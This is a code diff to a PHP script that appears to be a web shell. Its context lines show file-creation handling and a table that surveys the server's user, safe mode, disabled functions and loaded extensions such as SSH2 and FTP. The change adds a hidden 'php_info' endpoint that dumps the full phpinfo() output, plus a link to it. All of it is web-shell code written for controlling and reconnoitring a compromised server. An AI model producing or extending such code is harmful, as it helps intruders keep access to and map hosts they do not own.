@@ -48,6 +48,11 @@ $cwd = posix_getcwd();
 $free_disk_space = disk_free_space("/");
 $total_disk_space = disk_total_space("/");
 
+if (isset($_GET["php_info"]))
+{
+	phpinfo(); exit();
+}
+
 if (isset($_POST["mk_file"]))
 {
 	if (is_writable($cwd))
@@ -241,7 +246,7 @@ echo( sprintf("
 		<tr><td>User</td><td>%s</td></tr>
 		<tr><td>Group</td><td>%s</td></tr>
 		<tr><td>System</td><td>%s</td></tr>
-		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> <a href='https://www.php.net/manual/en/ini.core.php#ini.disable-functions' target='_blank'>[php.net]</a></td></tr>
+		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> %s</td></tr>
 		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
 		<tr><td>Current Directory</td><td>%s</td></tr>
 		<tr><td>Free / Total disk space</td><td>%s / %s (%s)</td></tr>
@@ -259,6 +264,7 @@ echo( sprintf("
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
 	ini_get("disable_functions") == "" ? "none" : ini_get("disable_functions"),
+	"<a href=" . $shell . '/?php_info' . ">[ phpinfo ]</a>",
 	extension_loaded("curl") ? "ON" : "OFF",
 	extension_loaded("rar") ? "ON" : "OFF",
 	extension_loaded("zip") ? "ON" : "OFF",
